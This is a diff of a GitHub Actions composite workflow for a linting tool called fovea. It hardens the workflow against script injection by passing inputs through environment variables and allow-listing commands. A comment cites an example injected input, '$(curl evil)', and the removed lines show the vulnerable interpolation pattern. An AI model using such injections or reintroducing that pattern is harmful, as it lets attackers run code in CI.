@@ -41,32 +41,43 @@ runs:
         cd "$GITHUB_ACTION_PATH/cli"
         go build -o "$RUNNER_TEMP/fovea" ./cmd/fovea
 
-    - name: "Run fovea ${{ inputs.command }}"
+    # Inputs reach bash only through env, never interpolated into the script:
+    # an expression expanded inside run: is spliced in before bash parses it, so
+    # an input like "$(curl evil)" would execute. From env it is plain data.
+    - name: "Run fovea"
       shell: bash
+      env:
+        FOVEA_COMMAND: ${{ inputs.command }}
+        FOVEA_DIR: ${{ inputs.dir }}
+        FOVEA_ARGS: ${{ inputs.args }}
       run: |
-        args=()
-        case "${{ inputs.command }}" in
-          lint)  args+=(--github) ;;
-          score) args+=(--json) ;;
+        case "$FOVEA_COMMAND" in
+          lint)   args=(--github) ;;
+          score)  args=(--json) ;;
+          render|issues) args=() ;;
+          *) echo "::error title=fovea::unknown command '$FOVEA_COMMAND' (lint | score | render | issues)"; exit 2 ;;
         esac
-        EXTRA=(${{ inputs.args }})
-        "$RUNNER_TEMP/fovea" "${{ inputs.command }}" "${args[@]}" "${EXTRA[@]}" "${{ inputs.dir }}"
+        # Split extra args on whitespace only: no globbing, no substitution.
+        read -r -a extra <<< "$FOVEA_ARGS"
+        "$RUNNER_TEMP/fovea" "$FOVEA_COMMAND" "${args[@]}" "${extra[@]}" "$FOVEA_DIR"
 
     - name: "Write fovea artifacts"
       if: always()
       shell: bash
+      env:
+        FOVEA_DIR: ${{ inputs.dir }}
+        FOVEA_ARTIFACT_DIR: ${{ inputs.artifact-dir }}
       run: |
-        mkdir -p "$GITHUB_WORKSPACE/${{ inputs.artifact-dir }}"
+        out="$GITHUB_WORKSPACE/$FOVEA_ARTIFACT_DIR"
+        mkdir -p "$out"
         # Artifacts are produced even when lint fails: the report is exactly
-        # what a red run should leave behind.
+        # what a red run should leave behind. Diagnostics go to stderr, so
+        # score.json stays valid JSON on a failing run.
         set +e
-        "$RUNNER_TEMP/fovea" score --json "${{ inputs.dir }}" \
-          > "$GITHUB_WORKSPACE/${{ inputs.artifact-dir }}/score.json" 2>/dev/null
-        "$RUNNER_TEMP/fovea" render "${{ inputs.dir }}" \
-          > "$GITHUB_WORKSPACE/${{ inputs.artifact-dir }}/scorecard.md" 2>/dev/null
-        "$RUNNER_TEMP/fovea" render --html "${{ inputs.dir }}" \
-          > "$GITHUB_WORKSPACE/${{ inputs.artifact-dir }}/scorecard.html" 2>/dev/null
+        "$RUNNER_TEMP/fovea" score --json "$FOVEA_DIR" > "$out/score.json"
+        "$RUNNER_TEMP/fovea" render "$FOVEA_DIR" > "$out/scorecard.md"
+        "$RUNNER_TEMP/fovea" render --html "$FOVEA_DIR" > "$out/scorecard.html"
         set -e
         # Job summary gets the HTML rendering (emoji RAG badges); GitHub
-        # renders tables+emoji there, which the markdown fence could not.
-        cat "$GITHUB_WORKSPACE/${{ inputs.artifact-dir }}/scorecard.html" >> "$GITHUB_STEP_SUMMARY"
+        # renders tables and emoji there, which the markdown fence could not.
+        cat "$out/scorecard.html" >> "$GITHUB_STEP_SUMMARY"
